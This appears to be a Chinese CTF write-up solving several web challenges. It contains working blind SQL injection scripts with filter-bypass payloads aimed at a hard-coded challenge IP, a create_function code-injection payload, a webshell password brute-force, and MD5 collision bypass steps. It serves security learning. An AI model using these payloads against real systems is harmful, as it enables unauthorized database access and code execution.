    <content type="html"><![CDATA[<p>平台已不运营</p><h2 id="Web签到"><a href="#Web签到" class="headerlink" title="Web签到"></a>Web签到</h2><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webqiandao_1.PNG" alt="Web签到"></p><p>发现请求URL为flag.php，但是会跳转到404.php页面，抓包发现有302重定向，查看响应包，flag经过base64编码，解码即可</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webqiandao_2.PNG" alt></p><blockquote><p>Tips：</p><p>重定向分为301和302两种</p><p>301为永久性</p><p>302为暂时性</p></blockquote><h2 id="下载下载"><a href="#下载下载" class="headerlink" title="下载下载"></a>下载下载</h2><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webxiazai_1.PNG" alt></p><p>直接请求<strong>?file=flag.php</strong>，获取源码，直接使用解密函数即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-Type: text/html; charset=utf-8'</span>); <span class="comment">//网页编码</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($data, $key)</span> </span>&#123;</span><br><span class="line">$key = md5 ( $key );</span><br><span class="line">$x = <span class="number">0</span>;</span><br><span class="line">$len = strlen ( $data );</span><br><span class="line">$l = strlen ( $key );</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $len; $i ++) &#123;</span><br><span class="line"><span class="keyword">if</span> ($x == $l) &#123;</span><br><span class="line">$x = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">$char .= $key &#123;$x&#125;;</span><br><span class="line">$x ++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $len; $i ++) &#123;</span><br><span class="line">$str .= chr ( ord ( $data &#123;$i&#125; ) + (ord ( $char &#123;$i&#125; )) % <span class="number">256</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> base64_encode ( $str );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($data, $key)</span> </span>&#123;</span><br><span class="line">$key = md5 ( $key );</span><br><span class="line">$x = <span class="number">0</span>;</span><br><span class="line">$data = base64_decode ( $data );</span><br><span class="line">$len = strlen ( $data );</span><br><span class="line">$l = strlen ( $key );</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $len; $i ++) &#123;</span><br><span class="line"><span class="keyword">if</span> ($x == $l) &#123;</span><br><span class="line">$x = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">$char .= substr ( $key, $x, <span class="number">1</span> );</span><br><span class="line">$x ++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $len; $i ++) &#123;</span><br><span class="line"><span class="keyword">if</span> (ord ( substr ( $data, $i, <span class="number">1</span> ) ) &lt; ord ( substr ( $char, $i, <span class="number">1</span> ) )) &#123;</span><br><span class="line">$str .= chr ( (ord ( substr ( $data, $i, <span class="number">1</span> ) ) + <span class="number">256</span>) - ord ( substr ( $char, $i, <span class="number">1</span> ) ) );</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$str .= chr ( ord ( substr ( $data, $i, <span class="number">1</span> ) ) - ord ( substr ( $char, $i, <span class="number">1</span> ) ) );</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key=<span class="string">"MyCTF"</span>;</span><br><span class="line">$flag=<span class="string">"o6lziae0xtaqoqCtmWqcaZuZfrd5pbI="</span>;<span class="comment">//encrypt($flag,$key);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//添加下面的语句即可</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> decrypt($flag,$key);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webxiazai_2.PNG" alt></p><h2 id="该网站已被黑"><a href="#该网站已被黑" class="headerlink" title="该网站已被黑"></a>该网站已被黑</h2><p><img src="http://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webshell_1.PNG" alt></p><p>御剑扫描一波</p><p><img src="http://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webshell_2.PNG" alt></p><p>登入shell.php</p><p><img src="http://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webshell_3.PNG" alt></p><p>可以使用burp暴力破解，密码为<strong>hack</strong></p><p><img src="http://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webshell_4.PNG" alt></p><h2 id="曲折的人生"><a href="#曲折的人生" class="headerlink" title="曲折的人生"></a>曲折的人生</h2><p>看到一个登陆页面，随便输入</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webquzherensheng_1.PNG" alt></p><p>有返回报错信息，可以构造or语句，获取登陆密码和用户名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,username,password from `admin` where username=&apos;admin&apos;用户名:admin不正确</span><br></pre></td></tr></table></figure><p>构造如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,username,password from `admin` where username=&apos;&apos; or ascii(substr((select password from `admin` limit 0,1),1,1))&gt;1 # &apos;&apos;</span><br></pre></td></tr></table></figure><p>写个脚本Fuzz一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.79.1.69:10005/index.php?check'</span></span><br><span class="line"></span><br><span class="line">uname_list = [<span class="string">' '</span>, <span class="string">'select'</span>, <span class="string">'or'</span>, <span class="string">'and'</span>, <span class="string">'union'</span>, <span class="string">'\''</span>, <span class="string">'from'</span>, <span class="string">'\\'</span>, <span class="string">'#'</span>, <span class="string">'--'</span>, <span class="string">'+'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> uname_list:</span><br><span class="line">data = &#123;<span class="string">'username'</span>:i&#125;</span><br><span class="line">result = requests.post(url=url, data=data)</span><br><span class="line">soup = BeautifulSoup(result.text,<span class="string">'lxml'</span>)</span><br><span class="line">links = soup.find_all(<span class="string">'div'</span>, class_=<span class="string">'tip'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> links:</span><br><span class="line">print(i + <span class="string">" 结果 "</span> + j.get_text())</span><br><span class="line">print(<span class="string">'************************************'</span>)</span><br></pre></td></tr></table></figure><p>可以知道，空格，select，or，union被过滤，但是可以采取重写方式绕过，空格采取/**/方式绕过</p><p>注入脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.79.1.69:10005/index.php?check'</span></span><br><span class="line">password = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#s = "'/**/oorr/**/length((seselectlect/**/passwoorrd/**/from/**/`admin`/**/limit/**/0,1))=3/**/#'"</span></span><br><span class="line"><span class="comment">#判断长度</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">s = <span class="string">"'/**/oorr/**/length((seselectlect/**/passwoorrd/**/from/**/`admin`/**/limit/**/0,1))="</span>+str(i)+<span class="string">"/**/#'"</span></span><br><span class="line">data = &#123;<span class="string">'username'</span>:s&#125;</span><br><span class="line">result = requests.post(url=url, data=data)</span><br><span class="line"><span class="keyword">if</span>(<span class="string">'goodboy'</span> <span class="keyword">in</span> result.text):</span><br><span class="line">print(i)</span><br><span class="line">length_pass = i</span><br><span class="line">soup = BeautifulSoup(result.text,<span class="string">'lxml'</span>)</span><br><span class="line">links = soup.find_all(<span class="string">'div'</span>, class_=<span class="string">'tip'</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> links:</span><br><span class="line">print(<span class="string">" 结果 "</span> + x.get_text())</span><br><span class="line">print(<span class="string">'************************************'</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#s = "'/**/oorr/**/ascii(substr((seselectlect/**/passwoorrd/**/from/**/`admin`/**/limit/**/0,1),1,1))&gt;1/**/#'"</span></span><br><span class="line"><span class="comment">#判断内容</span></span><br><span class="line">l = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,length_pass+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">s = <span class="string">"'/**/oorr/**/ascii(substr((seselectlect/**/passwoorrd/**/from/**/`admin`/**/limit/**/0,1),"</span>+str(i)+<span class="string">",1))"</span>+<span class="string">"="</span>+str(j)+<span class="string">"/**/#'"</span></span><br><span class="line">data = &#123;<span class="string">'username'</span>:s&#125;</span><br><span class="line">result = requests.post(url=url, data=data)</span><br><span class="line"><span class="keyword">if</span>(<span class="string">'goodboy'</span> <span class="keyword">in</span> result.text):</span><br><span class="line">print(<span class="string">"第"</span> + str(l) + <span class="string">"次"</span>)</span><br><span class="line">l = l + <span class="number">1</span></span><br><span class="line">password.append(chr(int(j)))</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">''</span>.join(password))</span><br><span class="line"><span class="comment">#ajahas&amp;&amp;*44askldajaj</span></span><br><span class="line"><span class="comment">#goodboy_g-60Hellowor 这里过滤了or 应输入 goodboy_g-60Hellowoorr</span></span><br></pre></td></tr></table></figure><p>快速计算脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.79.1.69:10005/index.php'</span></span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line"></span><br><span class="line">r = sess.get(url=url)</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(r.text,<span class="string">'lxml'</span>)</span><br><span class="line"></span><br><span class="line">links = soup.find_all(<span class="string">'div'</span>, class_=<span class="string">'rep'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> links:</span><br><span class="line">s = i.get_text()</span><br><span class="line"></span><br><span class="line">s = s.replace(<span class="string">'（'</span>,<span class="string">'('</span>)</span><br><span class="line">s = s.replace(<span class="string">'）'</span>,<span class="string">')'</span>)</span><br><span class="line">s = s.replace(<span class="string">'X'</span>,<span class="string">'*'</span>)</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">num = eval(s)</span><br><span class="line"></span><br><span class="line">print(num)</span><br><span class="line"></span><br><span class="line">urls = <span class="string">'http://120.79.1.69:10005/index.php?check'</span></span><br><span class="line">password = <span class="string">'ajahas&amp;&amp;*44askldajaj'</span></span><br><span class="line">uname = <span class="string">'goodboy_g-60Hellowoorr'</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">'username'</span>:uname, <span class="string">'password'</span>:password, <span class="string">'code'</span>:num&#125;</span><br><span class="line"></span><br><span class="line">res = sess.post(url=urls, data=data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>得到的响应，一个压缩包，也给出了解压密码</p><p><img src="http://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webquzherensheng_2.png" alt></p><p>解压之后，有一个加密的flag.zip，Form1.txt给出了解密方法，python脚本破解一下，结果是<code>VmH0wW3DZalBnmmSalV1SYSGRr1r3jVYcFrHWkUUlhljkFzCbXaEKyaVJymT1FlVTVskVWhGtonaGU2WWGhVXYol1WVI1F2odFuk</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">re_string = <span class="string">"VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU="</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_password</span><span class="params">(s)</span>:</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line">k = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span>(i &lt;= len(s)):</span><br><span class="line">k = k + s[i<span class="number">-1</span>:i]</span><br><span class="line">i = i + (i%<span class="number">5</span>)</span><br><span class="line"><span class="keyword">return</span> k</span><br><span class="line"></span><br><span class="line">password = get_password(re_string)</span><br><span class="line">print(get_password(password))</span><br></pre></td></tr></table></figure><blockquote><p>快速计算的那个也可以用正则表达式，这里用的是beautifulsoup解析，根据他class=rep这个唯一特征。</p></blockquote><h2 id="not-easy"><a href="#not-easy" class="headerlink" title="not easy"></a>not easy</h2><p>代码审计的题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>])) &#123;</span><br><span class="line">    $action = $_GET[<span class="string">'action'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]))&#123;</span><br><span class="line">    $arg = $_GET[<span class="string">'arg'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action($arg,<span class="string">''</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一题是create_function()注入。正则表达式中<strong>/i</strong>不区分大小写，<strong>/s</strong>匹配任何不可见字符，<strong>/D</strong>如果使用$限制结尾字符，则不允许结尾有换行。相当于在不允许使用数字字母下划线的情况下，调用函数。</p><p>这里使用的绕过方案是在函数前面加一个 \ ，P神在小密圈的解释</p><blockquote><p>php里默认命名空间是 \，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p></blockquote><p>对于create_function()，官方给的解释如下图</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webnoteasy_1.png" alt></p><p>以如下代码为例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$newfunc = create_function(<span class="string">'$a,$b'</span>, <span class="string">'return "ln($a) + ln($b) = " . log($a * $b);'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"New anonymous function: $newfunc\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $newfunc(<span class="number">2</span>, M_E) . <span class="string">"\n"</span>;</span><br><span class="line"><span class="comment">// outputs</span></span><br><span class="line"><span class="comment">// New anonymous function: lambda_1</span></span><br><span class="line"><span class="comment">// ln(2) + ln(2.718281828459) = 1.6931471805599</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一行代码等价于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__lambda_func</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"ln($a) + ln($b) = "</span> . log($a * $b); </span><br><span class="line">&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>在本题中，构造$action=\create_function，$action($arg,’’); 即为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lambda_1</span><span class="params">($arg)</span></span>&#123;</span><br><span class="line"><span class="string">''</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造$arg=){}print_r(scandir(‘./‘));/*，即可。</p><h2 id="audit"><a href="#audit" class="headerlink" title="audit"></a>audit</h2><p>又是代码审计</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&apos;flag.php&apos;);</span><br><span class="line">$str1 = @$_GET[&apos;str1&apos;];</span><br><span class="line">$str2 = @$_GET[&apos;str2&apos;];</span><br><span class="line">$str3 = @$_GET[&apos;str3&apos;];</span><br><span class="line">$str4 = @$_GET[&apos;str4&apos;];</span><br><span class="line">$str5 = (string)@$_POST[&apos;str5&apos;];</span><br><span class="line">$str6 = (string)@$_POST[&apos;str6&apos;];</span><br><span class="line">$str7 = (string)@$_POST[&apos;str7&apos;];</span><br><span class="line">if( $str1 == $str2 )&#123;</span><br><span class="line">    die(&apos;str1 OR Sstr2 no no no&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if( md5($str1) != md5($str2) )&#123;</span><br><span class="line">    die(&apos;step 1 fail&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if( $str3 == $str4 )&#123;</span><br><span class="line">    die(&apos;str3 OR str4 no no no&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if ( md5($str3) !== md5($str4))&#123;</span><br><span class="line">    die(&apos;step 2 fail&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if( $str5 == $str6 || $str5 == $str7 || $str6 == $str7 )&#123;</span><br><span class="line">    die(&apos;str5 OR str6 OR str7 no no no&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if (md5($str5) !== md5($str6) || md5($str6) !== md5($str7) || md5($str5) !== md5($str7))&#123;</span><br><span class="line">    die(&apos;step 3 fail&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!($_POST[&apos;a&apos;]) and !($_POST[&apos;b&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;come on!&quot;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">$a = $_POST[&apos;a&apos;];</span><br><span class="line">$b = $_POST[&apos;b&apos;];</span><br><span class="line">$m = $_GET[&apos;m&apos;];</span><br><span class="line">$n = $_GET[&apos;n&apos;];</span><br><span class="line"></span><br><span class="line">if (!(ctype_upper($a)) || !(is_numeric($b)) || (strlen($b) &gt; 6)) </span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;a OR b fail!&quot;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ((strlen($m) &gt; 4) || (strlen($n) &gt; 4)) </span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;m OR n fail&quot;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str8 = hash(&apos;md5&apos;, $a, false);</span><br><span class="line">$str9 = strtr(hash(&apos;md5&apos;, $b, false), $m, $n);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;p&gt;str8 : $str8&lt;/p&gt;&quot;;</span><br><span class="line">echo &quot;&lt;p&gt;str9 : $str9&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if (($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 6))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;You&apos;re great,give you flag:&quot;;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>第一部分</strong></p><ol><li>str1和str2进行md5弱比较，以0e开头的会被识别为科学计数法，结果均为0</li><li>str3和str4进行md5强比较，传入数组绕过</li><li>str5，str6，str7只能进行md5碰撞，需要生成三个md5相同的文件绕过</li></ol><p>参考这篇文章：<a href="https://xz.aliyun.com/t/3161#toc-5" target="_blank" rel="noopener">基于全等的MD5碰撞绕过</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">D:\fastcoll&gt;fastcoll_v1<span class="number">.0</span><span class="number">.0</span><span class="number">.5</span>.exe -o test0.txt test1.txt     <span class="comment">//-o参数代表随机生成两个相同MD5的文件</span></span><br><span class="line">D:\fastcoll&gt;fastcoll_v1<span class="number">.0</span><span class="number">.0</span><span class="number">.5</span>.exe -p test1.txt -o test00.txt test01.txt</span><br><span class="line"><span class="comment">//-p参数代表根据test1.txt文件随机生成两个相同MD5的文件，注意：生成的MD5与test1.txt不同</span></span><br><span class="line">D:\fastcoll&gt;tail.exe -c <span class="number">128</span> test00.txt &gt; a.txt               <span class="comment">//-c 128代表将test00.txt的最后128位写入文件a，这128位正是test1.txt与test00.txt的MD5不同的原因</span></span><br><span class="line">D:\fastcoll&gt;tail.exe -c <span class="number">128</span> test01.txt &gt; b.txt               <span class="comment">//同理</span></span><br><span class="line">D:\fastcoll&gt;type test0.txt a.txt &gt; test10.txt               <span class="comment">//这里表示将test0.txt和a.txt文件的内容合并写入test10.txt</span></span><br><span class="line">D:\fastcoll&gt;type test0.txt b.txt &gt; test11.txt               <span class="comment">//同理写入test11.txt</span></span><br></pre></td></tr></table></figure><p>然后对生成的文件进行URL编码，参考这篇文章：<a href="https://xz.aliyun.com/t/2232#toc-2" target="_blank" rel="noopener">如何用不同的数值构建一样的MD5</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">readmyfile</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">    $fh = fopen($path, <span class="string">"rb"</span>);</span><br><span class="line">    $data = fread($fh, filesize($path));</span><br><span class="line">    